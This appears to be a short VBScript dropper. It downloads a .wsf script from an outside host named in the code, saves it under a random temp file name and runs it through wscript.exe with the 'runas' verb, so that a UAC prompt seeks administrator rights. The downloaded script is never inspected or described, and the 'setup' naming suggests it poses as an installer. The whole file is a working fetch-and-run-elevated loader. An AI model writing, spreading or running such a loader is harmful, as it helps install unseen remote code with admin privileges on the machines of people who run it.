Option Explicit

Dim strURL, strTempFile, objShell, objFSO
Dim objHTTP, objStream

' === CONFIGURATION ===
strURL = "https://flask.sites.dylanservers.top/f/setup.wsf?download=1"
' =====================

' Create objects
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' Build temp file path
strTempFile = objFSO.GetSpecialFolder(2) & "\" & objFSO.GetTempName & ".wsf"

' Download the WSF file
On Error Resume Next
objHTTP.Open "GET", strURL, False
objHTTP.Send

If Err.Number <> 0 Then
    WScript.Echo "Failed to connect to URL: " & Err.Description
    WScript.Quit 1
End If

If objHTTP.Status <> 200 Then
    WScript.Echo "Download failed. HTTP Status: " & objHTTP.Status
    WScript.Quit 1
End If
On Error Goto 0

' Save the downloaded content to disk
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1 ' Binary
objStream.Open
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile strTempFile, 2 ' Overwrite
objStream.Close

' Run the WSF with admin privileges (triggers UAC prompt)
objShell.ShellExecute "wscript.exe", Chr(34) & strTempFile & Chr(34), "", "runas", 1

WScript.Quit 0
